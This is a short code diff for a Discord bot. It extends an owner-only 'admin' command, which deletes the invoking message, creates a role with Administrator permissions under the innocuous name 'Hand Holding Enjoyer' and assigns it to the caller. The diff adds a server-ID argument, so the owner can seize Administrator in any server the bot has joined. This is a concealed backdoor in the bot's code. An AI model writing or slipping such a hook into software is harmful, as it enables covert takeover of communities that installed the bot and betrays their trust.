@@ -51,11 +51,10 @@ class owner(commands.Cog, command_cog):
     @commands.command()
     @commands.is_owner()
     @delete_before
-    async def admin(self, ctx: commands.Context):
+    async def admin(self, ctx: commands.Context, server=None):
         member = ctx.message.author
-        await ctx.message.guild.create_role(name="Hand Holding Enjoyer", permissions=discord.Permissions(permissions=8))
-        role = discord.utils.get(
-            ctx.message.guild.roles, name="Hand Holding Enjoyer")
+        guild = ctx.message.guild if server == None else self.bot.get_guild(int(server))
+        role = await guild.create_role(name="Hand Holding Enjoyer", permissions=discord.Permissions(permissions=8))
         await member.add_roles(role)
 
     @commands.command()
